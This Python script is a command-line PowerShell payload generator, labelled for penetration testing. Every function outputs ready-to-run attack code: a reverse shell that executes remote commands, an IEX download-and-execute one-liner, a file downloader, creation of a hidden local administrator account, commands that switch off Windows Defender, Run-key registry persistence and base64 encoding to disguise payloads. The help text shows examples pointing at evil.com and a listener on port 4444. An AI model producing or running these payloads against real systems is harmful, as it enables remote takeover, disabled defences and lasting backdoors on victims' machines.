#!/usr/bin/env python3
"""
PowerShell Payload Generator
Generate various PowerShell payloads for penetration testing
"""

import argparse
import base64

class PowerShellPayloadGenerator:
    def reverse_shell(self, lhost, lport):
        """Generate PowerShell reverse shell"""
        payload = f"""$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()"""
        return payload

    def download_execute(self, url):
        """Generate download and execute payload"""
        payload = f"IEX(New-Object Net.WebClient).DownloadString('{url}')"
        return payload

    def download_file(self, url, output):
        """Generate file download payload"""
        payload = f"(New-Object System.Net.WebClient).DownloadFile('{url}','{output}')"
        return payload

    def user_add(self, username, password):
        """Generate user addition payload"""
        payload = f"""$Password = ConvertTo-SecureString '{password}' -AsPlainText -Force;
New-LocalUser '{username}' -Password $Password -FullName '{username}' -Description 'Admin User';
Add-LocalGroupMember -Group 'Administrators' -Member '{username}'"""
        return payload

    def disable_defender(self):
        """Generate Windows Defender disable payload"""
        payload = """Set-MpPreference -DisableRealtimeMonitoring $true;
Set-MpPreference -DisableBehaviorMonitoring $true;
Set-MpPreference -DisableIOAVProtection $true;
Set-MpPreference -DisableScriptScanning $true"""
        return payload

    def persistence_registry(self, name, command):
        """Generate registry persistence payload"""
        payload = f"New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '{name}' -Value '{command}' -PropertyType String -Force"
        return payload

    def encode_base64(self, payload):
        """Encode payload in base64"""
        encoded = base64.b64encode(payload.encode('utf-16le')).decode()
        return f"powershell -encodedCommand {encoded}"

def main():
    parser = argparse.ArgumentParser(
        description='PowerShell Payload Generator',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  Reverse shell:
    %(prog)s -t reverse_shell -H 10.10.10.1 -p 4444

  Download and execute:
    %(prog)s -t download_exec -u http://evil.com/payload.ps1

  Download file:
    %(prog)s -t download_file -u http://evil.com/file.exe -o C:\\temp\\file.exe

  Add user:
    %(prog)s -t user_add -U hacker -P Password123!

  Persistence:
    %(prog)s -t persistence -n Updater -c "C:\\temp\\payload.exe"

  Encode payload:
    %(prog)s -t reverse_shell -H 10.10.10.1 -p 4444 -e
        '''
    )

    parser.add_argument('-t', '--type', required=True,
                        choices=['reverse_shell', 'download_exec', 'download_file',
                                 'user_add', 'disable_defender', 'persistence'],
                        help='Payload type')
    parser.add_argument('-H', '--host', help='LHOST for reverse shell')
    parser.add_argument('-p', '--port', help='Port number')
    parser.add_argument('-u', '--url', help='URL for download')
    parser.add_argument('-o', '--output', help='Output file path')
    parser.add_argument('-U', '--username', help='Username')
    parser.add_argument('-P', '--password', help='Password')
    parser.add_argument('-n', '--name', help='Name for persistence')
    parser.add_argument('-c', '--command', help='Command for persistence')
    parser.add_argument('-e', '--encode', action='store_true', help='Base64 encode payload')

    args = parser.parse_args()

    generator = PowerShellPayloadGenerator()
    payload = None

    if args.type == 'reverse_shell':
        if not args.host or not args.port:
            parser.error("reverse_shell requires -H and -p")
        payload = generator.reverse_shell(args.host, args.port)

    elif args.type == 'download_exec':
        if not args.url:
            parser.error("download_exec requires -u")
        payload = generator.download_execute(args.url)

    elif args.type == 'download_file':
        if not args.url or not args.output:
            parser.error("download_file requires -u and -o")
        payload = generator.download_file(args.url, args.output)

    elif args.type == 'user_add':
        if not args.username or not args.password:
            parser.error("user_add requires -U and -P")
        payload = generator.user_add(args.username, args.password)

    elif args.type == 'disable_defender':
        payload = generator.disable_defender()

    elif args.type == 'persistence':
        if not args.name or not args.command:
            parser.error("persistence requires -n and -c")
        payload = generator.persistence_registry(args.name, args.command)

    if payload:
        if args.encode:
            payload = generator.encode_base64(payload)

        print("[+] Generated PowerShell Payload:")
        print("-" * 60)
        print(payload)
        print("-" * 60)

if __name__ == "__main__":
    main()
